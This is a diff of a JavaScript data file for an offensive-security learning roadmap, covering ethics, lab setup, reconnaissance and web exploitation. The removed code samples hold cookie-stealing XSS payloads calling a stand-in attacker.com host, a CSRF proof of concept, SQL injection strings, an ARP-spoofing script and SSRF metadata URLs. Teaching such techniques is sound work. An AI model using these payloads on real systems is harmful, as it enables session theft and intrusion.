@@ -1,289 +1,619 @@
 const hackingData = {
   name: "OFFENSIVE SECURITY & PENETRATION TESTING",
   area: "hack",
-  eyebrow: "Ethical Hacking · Red Teaming · Exploit Development",
-  sub: "Think like an attacker to defend like a professional. From reconnaissance to privilege escalation, from web exploitation to binary exploitation. Master the offensive mindset and techniques used by real adversaries.",
+  eyebrow: "Ethical Hacking · Red Teaming · Exploit Development · Adversarial Thinking",
+  sub: "Think like an attacker to defend like a professional. A complete journey from understanding the hacker mindset to advanced exploit development, red teaming, and adversary simulation. Every technique grounded in real methodology, not just tool usage.",
   phases: [
     {
-      name: "Foundations of Ethical Hacking",
+      name: "The Hacker Mindset and Legal Framework",
       level: "foundation",
-      tagline: "The hacker methodology",
-      desc: "Before you exploit, understand the legal, ethical, and technical foundations. Every successful attack follows a methodology: reconnaissance, scanning, exploitation, post-exploitation, and persistence.",
+      tagline: "Think offensively before touching a keyboard",
+      desc: "Offensive security is fundamentally about creative problem-solving. Before learning any technique, internalize the attacker's mindset: you are looking for the gap between how systems are intended to work and how they actually behave. Every misassumption is a potential vulnerability. This phase also establishes the legal and ethical framework — without it, you are just a criminal.",
       topics: [
         {
-          name: "Linux & Command Line Mastery",
+          name: "Ethics, Law, and the Rules of Engagement",
           tag: "core",
-          desc: "Kali Linux, Parrot OS, Ubuntu. Shell basics: bash, zsh. File system navigation, permissions (chmod, chown), process management (ps, top, kill, pkill), networking (ss, netstat, lsof, nc). Text processing: grep, awk, sed, cut, sort, uniq. Package management (apt, yum, pacman). Systemd (systemctl, journalctl).",
+          desc: "Penetration testing is legal hacking performed with explicit written permission. Without authorization, every technique in this guide constitutes a criminal offense in virtually every jurisdiction. The Computer Fraud and Abuse Act (CFAA) in the US, the Computer Misuse Act in the UK, and equivalent laws globally carry serious criminal penalties. A proper engagement always begins with a signed Statement of Work and Rules of Engagement (ROE) that define: scope (which systems can be tested), exclusions (off-limits systems), timing (business hours vs anytime), notification contacts, and allowed techniques. Bug bounty programs are a legitimate alternative — they define a scope and reward structure for responsible disclosure. Always get permission in writing, always stay in scope, always report findings professionally.",
           master: [
-            "Navigate file system and manipulate files using only the command line",
-            "Use grep with regex to extract IP addresses from logs",
-            "Write a bash script to automate reconnaissance tasks",
-            "Understand Linux file permissions: rwx, SUID, SGID, sticky bit",
-            "Use netcat to create a reverse shell and bind shell",
-            "Analyze running processes and kill malicious ones with pkill/kill",
-            "Parse Apache logs using awk and cut to find suspicious patterns"
+            "Understand the legal distinction between authorized penetration testing and unauthorized access",
+            "Explain the four types of penetration tests: black box, grey box, white box, red team",
+            "Draft a basic Rules of Engagement document for a penetration test",
+            "Understand responsible disclosure vs full disclosure vs coordinated disclosure",
+            "Know the major bug bounty programs (HackerOne, Bugcrowd) and how to read a scope",
+            "Understand the difference between a vulnerability assessment and a penetration test",
+            "Explain the penetration testing lifecycle: reconnaissance, scanning, exploitation, post-exploitation, reporting"
           ],
-          code: "#!/bin/bash\n# Port scanner using bash (for learning — use nmap in production)\n# Usage: ./portscan.sh 192.168.1.1 1-1000\n\nTARGET=$1\nPORT_RANGE=$2\n\nIFS='-' read -r START END <<< \"$PORT_RANGE\"\n\nfor PORT in $(seq $START $END); do\n    timeout 1 bash -c \"echo >/dev/tcp/$TARGET/$PORT\" 2>/dev/null && echo \"Port $PORT is open\"\ndone\n\n# One-liner to find SUID binaries (potential privilege escalation)\nfind / -perm -4000 -type f 2>/dev/null",
           res: [
-            "Linux Command Line and Shell Scripting Bible",
-            "Kali Linux Revealed (free PDF from Offensive Security)",
-            "OverTheWire Bandit (wargame for command line practice)",
-            "The Linux Command Line (William Shotts)"
+            "Penetration Testing (Georgia Weidman — excellent structured introduction)",
+            "The Web Application Hacker's Handbook (Stuttard & Pinto)",
+            "PTES (Penetration Testing Execution Standard) — ptes.org",
+            "OWASP Testing Guide (free, comprehensive methodology)"
           ]
         },
         {
-          name: "Networking for Hackers",
+          name: "Setting Up Your Lab",
           tag: "core",
-          desc: "Network protocols from an attacker's perspective. TCP/IP stack attacks: SYN flood, TCP reset injection, session hijacking. ARP spoofing (man-in-the-middle). DNS attacks: spoofing, cache poisoning, tunneling. Wireshark and tcpdump for traffic analysis. Traceroute, netcat, socat.",
+          desc: "Never practice on systems you don't own. A proper home lab is essential. Virtualization: VMware Workstation or VirtualBox to run multiple VMs simultaneously. Kali Linux is the industry-standard offensive security distribution with 600+ pre-installed tools. Parrot OS is a lighter alternative. Network isolation: create a host-only or NAT network so your lab VMs cannot reach the real internet. Vulnerable-by-design targets: Metasploitable 2 and 3 (intentionally vulnerable Linux/Windows), DVWA (Damn Vulnerable Web Application), VulnHub VMs, HackTheBox and TryHackMe platforms (legal, structured practice). Proxmox as a Type-1 hypervisor for more serious labs. Document everything: screenshots, tool output, methodology.",
           master: [
-            "Perform ARP spoofing with arpspoof or ettercap and capture traffic",
-            "Analyze a PCAP file with Wireshark: filter for HTTP requests, extract images/files",
-            "Use tcpdump to capture only SYN packets on port 443",
-            "Execute a TCP SYN flood attack using hping3 (in lab environment only)",
-            "Understand how DNS works: query types (A, AAAA, CNAME, MX, TXT)",
-            "Set up a rogue DHCP server and understand DHCP starvation attacks",
-            "Use socat to relay traffic between two hosts for MITM"
+            "Build a home lab with Kali Linux attacker VM and at least two vulnerable target VMs",
+            "Configure network isolation so lab VMs cannot reach production systems",
+            "Complete at least 10 TryHackMe or HackTheBox challenges to validate methodology",
+            "Understand the difference between VM network modes: NAT, bridged, host-only",
+            "Set up a documentation system: Obsidian, CherryTree, or Joplin for engagement notes",
+            "Configure Burp Suite Community Edition for web application testing",
+            "Understand the MITRE ATT&CK framework and how to map techniques to tactics"
           ],
-          code: "# Scapy script for ARP spoofing\ndef arp_spoof(target_ip, gateway_ip):\n    # Get MAC addresses\n    target_mac = get_mac(target_ip)\n    gateway_mac = get_mac(gateway_ip)\n    \n    # Craft ARP responses\n    target_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)\n    gateway_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)\n    \n    print(\"Starting ARP spoof...\")\n    try:\n        while True:\n            send(target_response, verbose=False)\n            send(gateway_response, verbose=False)\n            time.sleep(2)\n    except KeyboardInterrupt:\n        print(\"Restoring ARP tables...\")\n        restore(target_ip, gateway_ip, target_mac, gateway_mac)\n        print(\"Done.\")",
           res: [
-            "Wireshark Network Analysis (Chappell)",
-            "Practical Packet Analysis (Chris Sanders)",
-            "Scapy documentation (scapy.readthedocs.io)",
-            "TCP/IP Illustrated (Stevens) — attack perspective"
+            "TryHackMe (tryhackme.com — best platform for beginners, structured learning paths)",
+            "HackTheBox (hackthebox.com — harder, more realistic machines)",
+            "VulnHub (vulnhub.com — downloadable vulnerable VMs)",
+            "MITRE ATT&CK Framework (attack.mitre.org)"
           ]
         },
         {
-          name: "Web Technologies & HTTP Deep Dive",
+          name: "Linux Mastery for Hackers",
           tag: "core",
-          desc: "Every web app hack starts with HTTP knowledge. Methods (GET, POST, PUT, DELETE, PATCH, OPTIONS), status codes (2xx, 3xx, 4xx, 5xx), headers (Host, User-Agent, Cookie, Referer, X-Forwarded-For). Sessions vs tokens, cookies attributes (HttpOnly, Secure, SameSite). REST APIs, GraphQL. Burp Suite fundamentals.",
+          desc: "Linux is the primary operating system for both attackers and servers. Offensive security requires deep Linux fluency: filesystem navigation and permissions (read/write/execute, SUID/SGID/sticky bit — SUID is a common privilege escalation vector), process management (ps, top, kill, jobs), network tools (ss, netstat, ip, nc, socat), text processing (grep with regex, awk, sed, cut, sort, uniq, xargs — essential for parsing tool output), bash scripting for automation, package management, systemd. Understanding how Linux controls access — users, groups, capabilities, and namespaces — is foundational for both exploitation and hardening. The /proc, /sys, and /dev virtual filesystems expose kernel internals.",
           master: [
-            "Intercept and modify HTTP requests using Burp Suite Proxy",
-            "Understand each HTTP method's security implications (PUT/DELETE often disabled)",
-            "Explain HTTP vs HTTPS: SSL/TLS handshake, certificate validation",
-            "Identify insecure cookie attributes in HTTP responses",
-            "Use curl to craft custom HTTP requests with headers and body",
-            "Analyze a REST API endpoint for IDOR vulnerabilities",
-            "Understand HTTP/2 and HTTP/3 (QUIC) features and attack surface"
+            "Navigate the filesystem, manage permissions, and understand SUID/SGID implications",
+            "Write bash scripts to automate reconnaissance tasks",
+            "Use grep with extended regex to extract IPs, emails, and credentials from log files",
+            "Understand how Linux file permissions affect privilege escalation opportunities",
+            "Use netcat to create reverse shells, bind shells, and file transfer tunnels",
+            "Parse command output using awk, sed, and cut pipelines",
+            "Understand Linux capabilities and how they can replace or expand on SUID"
           ],
-          code: "#!/bin/bash\n# Using curl for web reconnaissance\n\n# Basic GET request with custom headers\ncurl -H \"User-Agent: Mozilla/5.0\" -H \"X-Forwarded-For: 127.0.0.1\" https://target.com\n\n# POST request with JSON body\ncurl -X POST https://api.target.com/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"admin\"}'\n\n# Extract cookies and use in subsequent requests\ncurl -c cookies.txt https://target.com/login\ncurl -b cookies.txt https://target.com/dashboard\n\n# Test for HTTP methods\ncurl -X OPTIONS https://target.com/api/users -v\ncurl -X PUT https://target.com/api/users/1 -d '{\"role\":\"admin\"}' -H \"Content-Type: application/json\"",
           res: [
-            "HTTP: The Definitive Guide (Gourley, Totty)",
-            "Burp Suite documentation (PortSwigger)",
-            "OWASP Web Security Testing Guide",
-            "MDN Web Docs: HTTP (developer.mozilla.org)"
+            "The Linux Command Line (William Shotts — free online)",
+            "Linux Basics for Hackers (OccupyTheWeb — specifically for offensive security)",
+            "OverTheWire Bandit wargame (command line skills through challenges)",
+            "Kali Linux Revealed (free from Offensive Security)"
           ]
         }
       ]
     },
     {
-      name: "Reconnaissance & Scanning",
-      level: "intermediate",
+      name: "Reconnaissance",
+      level: "foundation",
       tagline: "Know your target better than they know themselves",
-      desc: "Passive reconnaissance (OSINT) and active scanning (nmap, masscan). The more you know about your target before the exploit, the higher your success rate.",
+      desc: "The more you know before you attack, the higher your chance of success. Reconnaissance is the most time-intensive phase of any real engagement. Split into passive (no direct contact with the target) and active (direct interaction). The information gathered here guides every subsequent decision. A thorough recon often reveals the winning attack vector before a single exploit is run.",
       topics: [
         {
-          name: "OSINT — Open Source Intelligence",
+          name: "Passive Reconnaissance and OSINT",
           tag: "core",
-          desc: "Gathering information from public sources: DNS enumeration (dig, nslookup, dnsrecon), subdomain discovery (Sublist3r, Amass, assetfinder), WHOIS lookups, Shodan (searching for exposed devices), Censys, Google dorking, GitHub dorks, social media intelligence, theHarvester for email enumeration, Recon-ng framework.",
+          desc: "Open Source Intelligence (OSINT) gathers information from public sources without alerting the target. DNS reconnaissance: dig for A, AAAA, MX, TXT, NS records; zone transfer (AXFR) if misconfigured; subdomain enumeration via Amass, Subfinder, Assetfinder. WHOIS lookups reveal registrant info, registration dates, and often email addresses. Shodan (shodan.io) indexes internet-facing devices by their banners — search for open ports, services, and vulnerable versions without touching the target. Censys and FOFA for similar intel. Google Dorking: site:, intitle:, inurl:, filetype:, cache: operators to find sensitive files, admin panels, and login pages. GitHub and GitLab dorks: finding credentials, API keys, and internal documentation in public repositories. theHarvester for email enumeration. LinkedIn for organizational structure. Wayback Machine for historical content.",
           master: [
-            "Use dig to perform a DNS zone transfer (AXFR) if misconfigured",
-            "Find subdomains using Amass and Sublist3r, then verify with httpx",
-            "Search Shodan for exposed RDP servers on port 3389",
-            "Use Google dorks: site, intitle, inurl, filetype, cache",
-            "Extract email addresses from a domain using theHarvester",
-            "Find sensitive info in GitHub repos using GitHub search and gitleaks",
-            "Enumerate S3 buckets and test for public write access"
+            "Enumerate all subdomains of a target domain using at least three tools and cross-verify",
+            "Find exposed credentials or API keys in a company's GitHub repositories",
+            "Use Shodan to identify all internet-facing assets of a target organization",
+            "Construct Google dorks to find admin panels, login pages, and indexed files for a target",
+            "Build an organizational chart of a target company using LinkedIn OSINT",
+            "Find email format and verify addresses using hunter.io and email verification tools",
+            "Use the Wayback Machine to find old subdomains or exposed files no longer in DNS"
           ],
-          code: "#!/bin/bash\n# Subdomain enumeration and validation\n\nTARGET=$1\n\necho \"[+] Enumerating subdomains for $TARGET\"\n\n# Using multiple tools\nsublist3r -d $TARGET -o subdomains.txt\namass enum -d $TARGET -o amass_subs.txt\n\n# Combine and sort\ncat subdomains.txt amass_subs.txt | sort -u > all_subs.txt\n\n# Check which subdomains are live\necho \"[+] Checking live subdomains...\"\ncat all_subs.txt | httpx -status-code -title -tech-detect -o live_subs.txt\n\n# One-liner for Google dorks (manual search)\necho \"Try these dorks manually:\"\necho \"  site:$TARGET filetype:pdf\"\necho \"  site:$TARGET inurl:admin\"\necho \"  site:$TARGET intitle:'index of'\"",
           res: [
-            "OSINT Techniques (Michael Bazzell)",
-            "TheHarvester GitHub repo",
-            "Shodan Search Engine documentation",
-            "Google Hacking Database (GHDB)"
+            "OSINT Techniques (Michael Bazzell — comprehensive OSINT guide)",
+            "Google Hacking Database (ghdb.exploit-db.com)",
+            "Shodan Manual (shodan.io/manual)",
+            "Maltego documentation (powerful OSINT visualization tool)"
           ]
         },
         {
-          name: "Nmap Mastery",
+          name: "Active Scanning with Nmap",
           tag: "core",
-          desc: "The network mapper. Host discovery (-sn), port scanning techniques (-sS SYN stealth, -sT connect, -sU UDP, -sA ACK for firewall rules), version detection (-sV), OS detection (-O), script engine (NSE scripts). Timing templates (-T0 to -T5). Output formats (-oA for all formats).",
+          desc: "Nmap is the most important scanning tool in offensive security. Host discovery (-sn ping sweep) identifies live hosts before port scanning. Port scanning techniques: SYN scan (-sS, stealth — sends SYN, records SYN-ACK vs RST, never completes handshake), TCP connect scan (-sT, noisy — full three-way handshake), UDP scan (-sU, slow but important — DNS, SNMP, NTP run on UDP). Version detection (-sV) fingerprints services by their banners and behavior. OS detection (-O) uses TCP/IP stack fingerprinting. NSE (Nmap Scripting Engine): scripts in Lua for automatic vulnerability checks, service enumeration, and exploitation. Common scripts: http-enum (directory enumeration), vuln (vulnerability checks), ssl-heartbleed, smb-vuln-ms17-010. Timing templates (-T0 to -T5) control speed vs stealth.",
           master: [
-            "Perform a SYN stealth scan on a target: nmap -sS -p- -T4 target",
-            "Use NSE scripts: --script vuln (vulnerability scanning), --script default (safe scripts)",
-            "Perform UDP scan for DNS (53), SNMP (161), NTP (123)",
-            "Detect service versions with -sV and aggressive OS detection -O --osscan-guess",
-            "Scan an entire subnet with host discovery: nmap -sn 192.168.1.0/24",
-            "Use --script http-enum to enumerate web directories",
-            "Write a custom NSE script to check for a specific vulnerability"
+            "Perform a comprehensive scan: SYN scan of all ports, version detection, NSE default scripts",
+            "Use UDP scanning to find DNS, SNMP, NTP, and TFTP services",
+            "Run NSE vulnerability scripts against a Metasploitable target",
+            "Understand what a SYN scan packet looks like at the network layer",
+            "Evade basic IDS using decoy scans (-D), fragmented packets, and slow timing (-T1)",
+            "Write a basic NSE script to check for a specific HTTP response",
+            "Use masscan for high-speed internet-scale scanning when speed matters over stealth"
           ],
-          code: "# Common nmap commands\n\n# Comprehensive scan\nnmap -sC -sV -p- -T4 -oA full_scan target.com\n\n# Vulnerability scan\nnmap --script vuln -sV target.com\n\n# Firewall detection (ACK scan)\nnmap -sA target.com\n\n# Scan top 1000 ports with service detection\nnmap -sV --top-ports 1000 target.com\n\n# IPv6 scan\nnmap -6 -sS -p 80,443 2001:db8::1\n\n# Example NSE script structure (hello.nse)\n-- Script to check for open directory listing\naction = function(host, port)\n    local path = \"/\"\n    local response = http.get(host, port, path)\n    if response.status == 200 and response.body:match(\"Index of /\") then\n        return string.format(\"Open directory listing found at %s:%s%s\", host.ip, port.number, path)\n    end\nend",
           res: [
-            "Nmap Network Scanning (Fyodor — free official guide)",
+            "Nmap Network Scanning (Fyodor — free official guide, nmap.org/book)",
             "Nmap NSE documentation (nmap.org/nsedoc)",
-            "Nmap in the Enterprise (Angela Orebaugh)",
-            "Nmap Cheat Sheet (https://nmap.org/book/toc.html)"
+            "Masscan documentation (github.com/robertdavidgraham/masscan)",
+            "Network Scanning Cookbook (Solis)"
           ]
         },
         {
           name: "Web Application Reconnaissance",
           tag: "core",
-          desc: "Mapping web applications. Directory brute forcing (gobuster, dirb, dirsearch, ffuf), file extension fuzzing, parameter discovery. Technology stack detection (Wappalyzer, WhatWeb). CMS fingerprinting (wpscan for WordPress, droopescan for Drupal, JoomScan). API endpoint discovery.",
+          desc: "Web applications have a distinct reconnaissance methodology. Technology fingerprinting: Wappalyzer (browser extension) and WhatWeb identify CMS, frameworks, web servers, and libraries. Directory and file brute forcing: gobuster, ffuf, and dirsearch find hidden directories, backup files (.bak, .old, .zip), admin panels, and unlinked content. Parameter discovery: arjun finds hidden GET and POST parameters. API endpoint discovery: kiterunner uses real-world API wordlists. CMS-specific scanners: WPScan for WordPress (enumerates users, plugins, themes, known vulnerabilities), droopescan for Drupal, JoomScan for Joomla. JavaScript analysis: manually reviewing JS files and using linkfinder or relative-url-extractor to find endpoints and credentials. Burp Suite's spider and crawl functionality. Certificate transparency logs (crt.sh) for subdomain discovery.",
           master: [
-            "Use gobuster with a wordlist to find hidden directories: gobuster dir -u target.com -w /usr/share/wordlists/dirb/common.txt",
-            "Discover subdomains using ffuf with virtual host enumeration",
-            "Use wpscan to enumerate WordPress users, plugins, and themes",
-            "Fuzz parameters using ffuf or Burp Intruder to find hidden parameters",
-            "Use WhatWeb to identify technologies: whatweb target.com",
-            "Discover API endpoints using kiterunner or arjun",
-            "Extract JavaScript files and analyze for endpoints and secrets"
+            "Use ffuf to brute-force directories, files, and virtual hosts (vhost enumeration)",
+            "Analyze all JavaScript files from a target application for hardcoded secrets and endpoints",
+            "Use WPScan to enumerate WordPress users, vulnerable plugins, and CVEs",
+            "Find hidden GET/POST parameters using arjun",
+            "Use crt.sh certificate transparency search to find subdomains not in DNS",
+            "Identify the technology stack with three methods and cross-validate",
+            "Manually browse an application and map every input point, authentication mechanism, and function"
           ],
-          code: "#!/bin/bash\n# Web recon automation\n\nTARGET=$1\nWORDLIST=\"/usr/share/wordlists/dirb/common.txt\"\n\necho \"[+] Technology detection\"\nwhatweb $TARGET\necho \"\"\n\necho \"[+] Directory enumeration\"\ngobuster dir -u $TARGET -w $WORDLIST -t 50 -o dirs.txt\necho \"\"\n\necho \"[+] File extension fuzzing\"\nfor ext in php asp aspx jsp do cfm; do\n    gobuster dir -u $TARGET -w $WORDLIST -x $ext -o \"${ext}_files.txt\"\ndone\n\necho \"[+] Subdomain enumeration\"\nffuf -u \"http://FUZZ.$TARGET\" -w /usr/share/wordlists/subdomains.txt -o subdomains.txt\n\n# For WordPress\nif whatweb $TARGET | grep -qi \"wordpress\"; then\n    echo \"[+] WordPress detected, running wpscan\"\n    wpscan --url $TARGET --enumerate u,vp,vt\nfi",
           res: [
-            "ffuf GitHub (ffuf.io)",
-            "Gobuster documentation",
-            "WPScan User Guide",
-            "Web Application Hacker's Handbook (Stuttard, Pinto)"
+            "Web Application Hacker's Handbook (Stuttard & Pinto)",
+            "OWASP Web Security Testing Guide (free, comprehensive)",
+            "ffuf documentation (github.com/ffuf/ffuf)",
+            "HackTricks Web Application Pentesting (book.hacktricks.xyz — free)"
           ]
         }
       ]
     },
     {
       name: "Web Application Exploitation",
-      level: "advanced",
-      tagline: "Breaking web apps systematically",
-      desc: "OWASP Top 10 vulnerabilities and beyond. From injection to broken access control, from XSS to SSRF. Understand how to find and exploit these flaws in real applications.",
+      level: "intermediate",
+      tagline: "Breaking web applications systematically",
+      desc: "Web applications are the most common attack surface in modern engagements. This phase covers the OWASP Top 10 vulnerabilities and beyond — not just what they are, but how to find them, exploit them, and chain them together for maximum impact. Master Burp Suite as your primary weapon.",
       topics: [
         {
-          name: "SQL Injection",
+          name: "Injection Vulnerabilities",
           tag: "core",
-          desc: "Manipulating SQL queries. In-band (error-based, union-based), blind (boolean-based, time-based), out-of-band (DNS/HTTP exfiltration). Bypassing WAFs (case variation, comments, URL encoding, hex encoding). Second-order injection. Automated tools: sqlmap.",
+          desc: "Injection attacks occur when user-controlled data is interpreted as code or commands. SQL Injection is the most consequential: user input is embedded in SQL queries, allowing attackers to modify the query's logic. Types: in-band (error-based — the database error leaks information; union-based — extra SELECT appended to extract data), blind (boolean-based — true/false responses reveal data bit by bit; time-based — sleep functions confirm conditions via response delay). Tools: sqlmap automates detection and exploitation. Command injection: user input passed to shell execution functions (system(), exec(), popen()) — allows OS command execution. LDAP injection, XML injection (XXE — XML External Entity attacks that read local files or conduct SSRF). NoSQL injection for MongoDB (JSON operator injection). Template injection (SSTI — Server-Side Template Injection): input rendered by template engines like Jinja2, Twig, or Pebble enables RCE.",
           master: [
-            "Manually exploit a login bypass using ' OR 1=1 --",
-            "Use UNION-based injection to extract database names, tables, columns",
-            "Perform boolean blind injection by analyzing response differences",
-            "Extract data via time-based blind injection: ' AND SLEEP(5) --",
-            "Use sqlmap to automate detection and exploitation with --dbms, --level, --risk",
-            "Bypass a WAF using URL encoding and comment injection",
-            "Understand and exploit second-order SQL injection"
+            "Manually identify and exploit union-based SQL injection to extract the full database schema",
+            "Perform blind time-based SQL injection to extract usernames without any output",
+            "Use sqlmap effectively: know the parameters for level, risk, technique, and tamper scripts",
+            "Identify and exploit command injection — understand which characters break command context",
+            "Exploit XXE to read /etc/passwd and then escalate to SSRF for internal requests",
+            "Identify and exploit SSTI in Jinja2 — understand how to achieve RCE via template context",
+            "Bypass WAF filters for SQL injection using comment obfuscation, case variation, and encoding"
           ],
-          code: "# Manual SQL injection examples\n\n# Login bypass\n' OR '1'='1' --\nadmin' --\n\n# Union-based extraction (numeric parameter)\n' UNION SELECT database(), user(), version() --\n\n# Extract table names\n' UNION SELECT table_name, NULL FROM information_schema.tables --\n\n# Blind boolean (true condition)\n' AND SUBSTRING(database(),1,1) = 'a' --\n\n# Time-based blind\n' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --\n\n# Sqlmap command\nsqlmap -u \"http://target.com/page?id=1\" --dbs --batch\nsqlmap -u \"http://target.com/page?id=1\" -D database_name --tables\nsqlmap -u \"http://target.com/page?id=1\" -D database_name -T users --dump",
+          deepdive: "SSTI is one of the most dangerous vulnerabilities in modern web applications. When user input is rendered by a server-side template engine, the input has access to the template's execution context. In Jinja2 (Python), the class hierarchy provides access to every loaded Python module. Via __class__.__mro__.__subclasses__(), an attacker can reach subprocess.Popen and execute OS commands. The path from template input to arbitrary command execution is often fewer than three steps.",
           res: [
-            "SQL Injection (Robert Hansen, Jeremiah Grossman)",
-            "The SQL Injection Bible (PentesterLab)",
+            "PortSwigger Web Security Academy — SQL injection labs (free, best practice environment)",
             "sqlmap documentation (sqlmap.org)",
-            "PortSwigger Web Security Academy — SQL injection labs"
+            "Server-Side Template Injection (PortSwigger research blog)",
+            "PayloadsAllTheThings (GitHub — comprehensive payload lists for all injection types)"
           ]
         },
         {
-          name: "Cross-Site Scripting (XSS)",
+          name: "Authentication and Session Attacks",
           tag: "core",
-          desc: "Injecting malicious scripts into web pages. Types: Reflected (non-persistent), Stored (persistent), DOM-based (client-side). Contexts: HTML context (tag injection, attribute injection), JavaScript context (string injection, eval injection), CSS context. Evasion techniques. XSS to session hijacking, CSRF bypass, keylogging.",
+          desc: "Authentication is the most frequently broken security control. Common flaws: default credentials (admin:admin, admin:password — always check), username enumeration (different error messages for valid vs invalid users), brute force with no rate limiting or lockout, insecure password reset flows (predictable tokens, weak security questions, host header injection in reset links). Session management attacks: session token with low entropy (predictable), session fixation (attacker sets a known session ID before authentication), session not invalidated on logout. JWT attacks: algorithm confusion (changing HS256 to none or RS256 to HS256 using the public key as the HMAC secret), weak secret brute-forcing, kid injection. OAuth misconfigurations: open redirectors in redirect_uri, state parameter CSRF, token leakage via Referer. Multi-factor authentication bypass: SIM swapping (social), MFA fatigue (push notification spam).",
           master: [
-            "Craft a reflected XSS payload: <script>alert('XSS')</script>",
-            "Bypass HTML encoding with event handlers: <body onload=alert(1)>",
-            "Use DOM-based XSS by manipulating window.location.hash",
-            "Steal cookies with XSS: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
-            "Perform XSS to CSRF: send authenticated request to change password",
-            "Bypass CSP (Content Security Policy) with unsafe-inline or JSONP endpoints",
-            "Use XS-Leaks techniques for cross-site information leakage"
+            "Identify username enumeration from timing differences or different error messages",
+            "Exploit a JWT with the 'none' algorithm or algorithm confusion vulnerability",
+            "Find and exploit an insecure password reset flow using host header injection",
+            "Bypass rate limiting on a login form using IP rotation and user-agent variation",
+            "Exploit OAuth redirect_uri validation flaws to steal authorization codes",
+            "Understand and exploit session fixation attacks",
+            "Crack a weak JWT secret using hashcat and a wordlist"
           ],
-          code: "<!-- XSS payload examples -->\n\n<!-- Basic alert -->\n<script>alert('XSS')</script>\n\n<!-- HTML attribute injection (no quotes) -->\n\" onmouseover=\"alert(1)\" \n\n<!-- JavaScript context injection (string) -->\n'; alert(1); var foo='\n\n<!-- DOM-based via hash -->\nhttp://target.com/#<img src=x onerror=alert(1)>\n\n<!-- Polyglot XSS (works in multiple contexts) -->\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n\n<!-- Steal cookies and redirect -->\n<script>new Image().src='http://attacker.com/steal?c='+document.cookie;location='http://target.com/login'</script>",
           res: [
-            "XSS Prevention Cheat Sheet (OWASP)",
-            "DOM-based XSS (PortSwigger Research)",
-            "Exotic XSS Vectors (various write-ups)",
-            "XSS Hunter (platform for blind XSS)"
+            "PortSwigger Web Security Academy — authentication labs",
+            "JWT Attacks (PortSwigger research)",
+            "OAuth Security Workshop materials",
+            "The Web Application Hacker's Handbook — authentication chapters"
           ]
         },
         {
-          name: "SSRF, CSRF & IDOR",
+          name: "XSS, CSRF, SSRF, and Access Control",
           tag: "advanced",
-          desc: "Broken access control vulnerabilities. SSRF (Server-Side Request Forgery): making internal requests from server, accessing metadata endpoints (AWS, GCP), port scanning internal networks. CSRF (Cross-Site Request Forgery): forcing authenticated requests via malicious site. IDOR (In-Direct Object Reference): accessing unauthorized resources by manipulating IDs.",
+          desc: "Cross-Site Scripting (XSS): injecting malicious scripts into pages viewed by other users. Reflected (non-persistent, in URL), stored (persistent, saved in database), DOM-based (JavaScript reads from attacker-controlled source and writes to dangerous sink). XSS impact: session hijacking, keylogging, phishing overlays, BeEF framework for browser exploitation. CSP (Content Security Policy) bypass techniques. CSRF (Cross-Site Request Forgery): forcing an authenticated user's browser to make requests to a target site without their knowledge. Modern mitigations: SameSite cookie attribute, CSRF tokens. SSRF (Server-Side Request Forgery): making the server send requests on your behalf — reach internal services, cloud metadata endpoints (169.254.169.254), and internal APIs. IDOR (Insecure Direct Object Reference): changing an ID in a request accesses another user's data. Broken access control is the #1 OWASP category.",
           master: [
-            "Exploit SSRF to access AWS metadata: http://169.254.169.254/latest/meta-data/",
-            "Use SSRF to scan internal network: try common internal IPs (10.0.0.1, 192.168.1.1)",
-            "Bypass SSRF filters with redirects, DNS rebinding, alternative encodings",
-            "Craft a CSRF POC that changes user email via a hidden form",
-            "Bypass CSRF tokens by checking if token is predictable or missing",
-            "Find IDOR by changing numeric IDs in URLs (user_id=1 to user_id=2)",
-            "Use authorization header analysis to find JWT claims that can be forged"
+            "Exploit stored XSS to steal session cookies and demonstrate account takeover",
+            "Bypass CSP using JSONP callbacks, open redirectors, or dangling markup",
+            "Craft a CSRF proof-of-concept that changes a victim's email or password",
+            "Use SSRF to access the AWS EC2 metadata service and extract IAM credentials",
+            "Bypass SSRF filters using localhost alternatives: 0.0.0.0, 127.0.0.1, 0177.0.0.1 (octal)",
+            "Find IDOR vulnerabilities by analyzing every ID, GUID, or reference in requests",
+            "Exploit horizontal and vertical privilege escalation via broken access control"
           ],
-          code: "<!-- CSRF POC (POST request) -->\n<html>\n<body>\n<form action=\"https://target.com/api/change-email\" method=\"POST\">\n    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>\n    document.forms[0].submit();\n</script>\n</body>\n</html>\n\n<!-- IDOR testing examples -->\n# Change user ID\n/api/users/123/profile -> /api/users/124/profile\n\n# Encode IDs (try base64, hex)\n/api/users/MTIz -> base64 for 123\n\n# Change file names\n/download?file=invoice_123.pdf -> /download?file=../../config.php\n\n# SSRF test endpoints\nhttp://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:8080/admin\nhttp://localhost/phpinfo.php\nfile:///etc/passwd\n\n# SSRF with DNS rebinding (script)\n# 1. Register domain with TTL=0\n# 2. Return attacker IP, then switch to 127.0.0.1 after resolution",
           res: [
-            "SSRF Bible (Wallarm)",
-            "CSRF Prevention Cheat Sheet (OWASP)",
-            "IDOR: The Vulnerability That Keeps on Giving (PortSwigger)",
-            "HackTricks — SSRF tricks"
+            "PortSwigger Web Security Academy — XSS, CSRF, SSRF, and access control labs",
+            "OWASP Top 10 (owasp.org/Top10 — read the full explanations)",
+            "XSS Hunter (xsshunter.com — blind XSS platform)",
+            "HackTricks SSRF section (book.hacktricks.xyz)"
           ]
         }
       ]
     },
     {
-      name: "Exploit Development & Binary Exploitation",
-      level: "expert",
-      tagline: "Turning vulnerabilities into code execution",
-      desc: "The hardest core of offensive security. Buffer overflows, return-oriented programming (ROP), heap exploitation, kernel exploits. Master x86/x64 assembly, debugging with GDB, and modern mitigation bypasses.",
+      name: "Network Penetration Testing",
+      level: "intermediate",
+      tagline: "Attacking network infrastructure and services",
+      desc: "Beyond web applications, most engagements involve attacking network services, internal infrastructure, and Windows/Linux systems. This phase covers the methodology for network pentesting: from service enumeration to exploitation of specific services and protocols.",
       topics: [
         {
